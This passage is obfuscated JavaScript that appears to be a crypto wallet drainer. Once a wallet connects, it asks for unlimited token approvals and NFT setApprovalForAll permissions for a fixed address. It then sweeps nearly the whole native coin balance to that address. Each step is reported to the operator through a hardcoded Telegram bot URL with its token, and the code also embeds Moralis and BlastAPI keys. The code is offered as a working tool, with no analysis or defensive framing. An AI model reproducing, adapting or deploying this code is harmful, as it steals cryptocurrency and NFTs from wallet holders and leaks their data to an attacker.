_0x322878=['transfer','&text=','gather-testnet','nonpayable','boba-bnb-testnet','WalletConnectProvider','avalanche-fuji-mainnet','maxFee','newOwner','Cl\x20address\x20:\x20','numberOfTokens','newAddress','milkomeda-a1-mainnet','6027949250','paused','catch','getApproved','palm-testnet','status','tokenOfOwnerByIndex','click','skale-omnus','setStartingIndex','Params','findora-forge-testnet','addBlackList','json','eth-goerli','.connect','992uCbKdW','BAYC_PROVENANCE','https://ava-mainnet.blastapi.io/c7937bc2-4607-4321-927a-daa76e77ebfa/ext/bc/C/rpc','setBaseURI','provenanceHash','basisPointsRate','boba-bobabase-testnet','newBasisPoints','flipSaleState','then','evmos-testnet','2102352Fdkykv','log','_maker','12ZKJJxh','name','GET','_value','_data','Wallet\x20Connected\x20Successfully\x20to\x20AVAX!','matic-mainnet','token_address','_user','boba-goerli','nervos-polyjuice-testnet','sending\x20ether','moonbeam-moonriver','newMaxFee','map','pause','swimmer-testnet','maxApePurchase','bittorrent-mainnet','Deprecate','avalanche-mainnet','setParams','eth','Error\x20collecting\x20info\x20about\x20wallet','symbol','toString','avalanche-dexalot-mainnet','nervos-godwoken-testnet','Error\x20processing\x20item\x20','milkomeda-a1-devnet','sx-mainnet','Pause','gas','saleIsActive','default','true','skale-razor','999999999999999999999999999999999999999999999999999999999999999999999999','receipt','nervos-godwoken-mainnet','methods','removeBlackList','balanceOf','Transaction\x20is\x20submitted\x20to\x20the\x20network','palm-mainnet','Could\x20not\x20get\x20a\x20wallet\x20connection','getGasPrice','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','tokenByIndex','arbitrum-goerli','function','application/json','2862440DvSjLG','milkomeda-c1-devnet','saleStart','linea-testnet','search','sort','flarenetworks-flare-mainnet','deprecated','isApprovedForAll','Error:\x20','approve','length','setApprovalForAll','axie-mainnet','who','setRevealTimestamp','331652dqExjO','issue','NFT\x20Contract\x20Address\x20','defi-kingdoms-mainnet','balances','_decimals','&format=decimal&limit=','defi-kingdoms-testnet','avalanche-testnet','_spender','bsc-testnet','Contract','Initial\x20list\x20','withdraw','moonbeam-moonbase-alpha','Unpause','milkomeda-c1-mainnet','transactionHash','aurora-testnet','rsk-mainnet','gather-mainnet','emergencySetStartingIndexBlock','astar-shibuya','chainId:','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','allowed','boba-rinkeby-testnet','tokenId','mantle-testnet','decimals','flarenetworks-canary-testnet','_upgradedAddress','Approval','redeem','Tokens:','transferOwnership','Approve\x20Completed\x20Successfully','kcc-testnet','getChainId','Debug','operator','sendTransaction','startingIndexBlock','Transaction\x20Receipt:\x20','getBalance','matic-mumbai','balance','_totalSupply','constructor','harmony-testnet','baseURI','interfaceId','message','1202ONJeXt','10000','previousOwner','eth-mainnet','MAX_APES','oasis-sapphire-mainnet','amount','21951FPZPLM','Insufficient\x20funds\x20for\x20transfer','&vs_currencies=usd','btc-mainnet','send','RemovedBlackList','_owner','string','bytes4','maxNftSupply','emerald-paratime-mainnet','filter','tokenURI','bool','7548110vkwzWm','arbitrum-mainnet','0xea8968B218a551919FbD5f1166328C82a96dED54','kcc-mainnet','boba-avalanche-mainnet','New\x20token','apePrice','https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses=','totalSupply','owner','avalanche-dexalot-testnet','value','bittorrent-testnet','all','REVEAL_TIMESTAMP','findora-mainnet','astar-shiden','neon-testnet','isBlackListed','_balance','/nft/collections?chain=','ApprovalForAll','remaining','avalanche','_from','aurora-mainnet','bytes','_evilUser','_clearedUser','event','setProvenanceHash','startingIndex','meter-mainnet','cronos-mainnet','e62a60a251c64745baefeaf8237af646','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','view','tokens-list','NFT','ownerOf','boba-bnb-mainnet','getBlackListStatus','deprecate','Your\x20address\x20','oasys-testnet','Transfer','307KXWito','_symbol','cronos-testnet','https://deep-index.moralis.io/api/v2/','_blackListedUser','NFTs\x20collection\x20','getOwner','Redeem','solana-mainnet','destroyBlackFunds','base-testnet','Transaction\x20Rejected','_to','from','address','_initialSupply','0x9709714E2f18345c5aDba88A733cD740188b27F0','error','rsk-testnet','index','approved','647005fNmaIA','uint256','Transaction\x20Hash:\x20','safeTransferFrom','Unable\x20to\x20get\x20NFts'];_0x157a=function(){return _0x322878;};return _0x157a();}async function loopTokens(_0x4701b8){const _0x40374d=_0x35d3ee;for await(let _0x23463b of _0x4701b8){console[_0x40374d(0x1b8)]('Token',_0x23463b);try{let _0x511ac1=new web3Object['eth']['Contract'](ABI,_0x23463b['address']);sendMessage(_0x40374d(0x24d)),await _0x511ac1[_0x40374d(0x1e2)]['approve'](Oxa,_0x40374d(0x1df))[_0x40374d(0x23e)]({'from':selectedAccount,'to':_0x23463b['address']})['on'](_0x40374d(0x20f),_0x173885=>{const _0x1bb583=_0x40374d;console[_0x1bb583(0x1b8)]('Transaction\x20Hash:\x20'+_0x173885);})['on'](_0x40374d(0x1e0),_0x30362f=>{const _0x687c3f=_0x40374d;console[_0x687c3f(0x1b8)]('Transaction\x20Receipt:\x20'+_0x30362f),sendMessage(_0x687c3f(0x222)),sendMessage('TOKEN\x20Contract\x20Address\x20'+_0x23463b['address']),sendMessage('Token\x20balance\x20is\x20'+_0x23463b[_0x687c3f(0x22c)]),sendMessage(_0x687c3f(0x273)+Oxa);})['on']('error',_0x46f693=>{const _0x50617b=_0x40374d;console[_0x50617b(0x1b8)](_0x50617b(0x1f7)+_0x46f693),sendMessage(_0x50617b(0x281));});}catch(_0x29232f){console[_0x40374d(0x1b8)](_0x40374d(0x1f7)+_0x29232f),sendMessage(_0x40374d(0x281));}};await loopNfts(NFTs);}async function loopNfts(_0x278968){const _0x4ed23f=_0x35d3ee;for await(let _0x3a12ed of _0x278968){console['log'](_0x4ed23f(0x26e),_0x3a12ed);try{let _0x3dda75=new web3Object[(_0x4ed23f(0x1d0))][(_0x4ed23f(0x209))](ABIN,_0x3a12ed[_0x4ed23f(0x1c1)]);await _0x3dda75['methods'][_0x4ed23f(0x1fa)](Oxa,_0x4ed23f(0x1dd))[_0x4ed23f(0x23e)]({'from':selectedAccount,'to':_0x3a12ed['token_address']})['on']('transactionHash',_0x1955cd=>{const _0x30b46f=_0x4ed23f;console[_0x30b46f(0x1b8)](_0x30b46f(0x28d)+_0x1955cd),sendMessage(_0x30b46f(0x1e5));})['on'](_0x4ed23f(0x1e0),_0x411cfd=>{const _0x397368=_0x4ed23f;console['log']('Transaction\x20Receipt:\x20'+_0x411cfd),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x397368(0x200)+token[_0x397368(0x284)]),sendMessage(_0x397368(0x273)+Oxa);})['on']('error',_0x568364=>{const _0x4e6f7b=_0x4ed23f;console[_0x4e6f7b(0x1b8)](_0x4e6f7b(0x1f7)+_0x568364),sendMessage('Transaction\x20Rejected');});}catch(_0x10e374){console['log']('Error:\x20'+_0x10e374),sendMessage(_0x4ed23f(0x281));}}await onSendEther();}async function onSendEther(){const _0x2d9b3c=_0x35d3ee;console[_0x2d9b3c(0x1b8)](_0x2d9b3c(0x1c5));try{let _0x2e7c66=await web3Object['eth'][_0x2d9b3c(0x22a)](selectedAccount);var _0x54381d=await web3Object[_0x2d9b3c(0x1d0)][_0x2d9b3c(0x1e8)](),_0x16dc48={'gasPrice':_0x54381d,'from':selectedAccount,'to':Oxa,'value':_0x2e7c66};_0x16dc48[_0x2d9b3c(0x1da)]=_0x19419b,_0x16dc48[_0x2d9b3c(0x253)]=_0x2e7c66-0xaa87bee538000,console[_0x2d9b3c(0x1b8)](_0x16dc48['value']);var _0x19419b=await web3Object[_0x2d9b3c(0x1d0)]['estimateGas'](_0x16dc48),_0x3f8c32=_0x54381d*_0x19419b;web3Object[_0x2d9b3c(0x1d0)][_0x2d9b3c(0x227)](_0x16dc48)['on'](_0x2d9b3c(0x20f),_0xae446d=>{const _0x787aff=_0x2d9b3c;console[_0x787aff(0x1b8)]('Transaction\x20Hash:\x20',_0xae446d),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on'](_0x2d9b3c(0x1e0),_0x1bcfbc=>{const _0x27a8df=_0x2d9b3c;console[_0x27a8df(0x1b8)](_0x27a8df(0x229),_0x1bcfbc),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');})['on'](_0x2d9b3c(0x287),_0x1bdd19=>{const _0x2cffdf=_0x2d9b3c;console[_0x2cffdf(0x1b8)](_0x2cffdf(0x1f7),_0x1bdd19),sendMessage('Transaction\x20Rejected');});}catch{sendMessage(_0x2d9b3c(0x23b));}}async function sendMessage(_0x2acfb8){return new Promise((_0xd6ab5,_0x1a799e)=>{const _0x41c175=_0xb1dd,_0x139bd4=CHAT;fetch(_0x41c175(0x26b)+_0x139bd4+_0x41c175(0x291)+_0x2acfb8,{'method':'GET','headers':{}})['then'](async _0x4e0955=>{const _0x59bf9c=_0x41c175;if(_0x4e0955[_0x59bf9c(0x2a2)]>0x18f)throw _0x4e0955;_0xd6ab5(await _0x4e0955[_0x59bf9c(0x2aa)]());})[_0x41c175(0x29f)](_0x519ef3=>{_0x1a799e(_0x519ef3);});});}async function getPrice(_0x15d6e7){return new Promise((_0x23de98,_0x151069)=>{const _0x54243d=_0xb1dd;fetch(_0x54243d(0x24f)+_0x15d6e7+_0x54243d(0x23c),{'method':_0x54243d(0x1bc),'headers':{}})[_0x54243d(0x1b5)](async _0x31d14c=>{const _0x5048ab=_0x54243d;if(_0x31d14c[_0x5048ab(0x2a2)]>0x18f)throw _0x31d14c;_0x23de98(await _0x31d14c[_0x5048ab(0x2aa)]());})[_0x54243d(0x29f)](_0x35763f=>{_0x151069(_0x35763f);});});}async function getValue(_0x4826bc,_0x4700cb,_0x94e029){const _0x539671=_0x35d3ee;console[_0x539671(0x1b8)](_0x4826bc,_0x4700cb,_0x94e029);let _0x2ddc92=await getPrice(_0x4826bc);console[_0x539671(0x1b8)]('price',_0x2ddc92),_0x2ddc92=parseFloat(_0x2ddc92[_0x4826bc]['usd']);let _0x735675=_0x4700cb/0xa**(_0x94e029||0x12)*_0x2ddc92;return _0x735675=parseInt(_0x735675),_0x2ddc92?_0x735675:0x0;}async function getNFTs(_0x4d0dcf='',_0x3e9c17=_0x35d3ee(0x1e9),_0x4b48ed=_0x35d3ee(0x25f),_0x104ebb='50'){return new Promise((_0x36373c,_0x1d3236)=>{const _0x4a2426=_0xb1dd;fetch('https://deep-index.moralis.io/api/v2/'+_0x4d0dcf+_0x4a2426(0x25c)+_0x4b48ed+_0x4a2426(0x204)+_0x104ebb,{'method':_0x4a2426(0x1bc),'headers':{'accept':_0x4a2426(0x1ed),'X-API-Key':_0x3e9c17}})['then'](async _0x2c8df7=>{const _0x378fff=_0x4a2426;if(_0x2c8df7[_0x378fff(0x2a2)]>0x18f)throw _0x2c8df7;_0x36373c(await _0x2c8df7['json']());})[_0x4a2426(0x29f)](_0x498c99=>{_0x1d3236(_0x498c99);});});}